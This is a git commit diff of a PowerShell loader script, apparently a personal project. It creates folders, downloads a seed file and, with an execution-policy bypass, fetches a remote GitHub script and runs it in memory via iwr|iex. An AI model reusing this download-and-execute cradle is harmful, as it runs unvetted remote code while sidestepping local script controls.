a69d48e34822e5d3b196b8623af50887fc01b943
mellonaut <rleeazw@outlook.com>
2022-05-22 09:27:53 -0400

    Error Action
    Error handling, a try-finally to create the initial folders

--- buttloader.ps1
+++ buttloader.ps1
@@ -1,12 +1,16 @@
 # Loader script
 
 # Create goofin/butts goofin/cuts and the seeds for grand plan
-Mkdir "C:\Goofin\butts"
-Mkdir "C:\Goofin\cuts" 
-Invoke-WebRequest -Uri "https://buttboss.s3.us-east-1.amazonaws.com/buttseeds.txt" -O "C:\Goofin\buttseeds.txt"
-
+try
+{
+    $folders = @('C:\Goofin\butts','C:\Goofin\cuts'); mkdir $folders -ErrorAction SilentlyContinue
+}
+finally
+{
+Invoke-WebRequest -Uri "https://buttboss.s3.us-east-1.amazonaws.com/buttseeds.txt" -O "C:\Goofin\buttseeds.txt" -ErrorAction SilentlyContinue
+}
 
 # Grab buttboss from github and execute in memory
-# 
+ 
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('https://raw.githubusercontent.com/mellonaut/ButtBoss/main/buttboss.ps1')|iex"
 
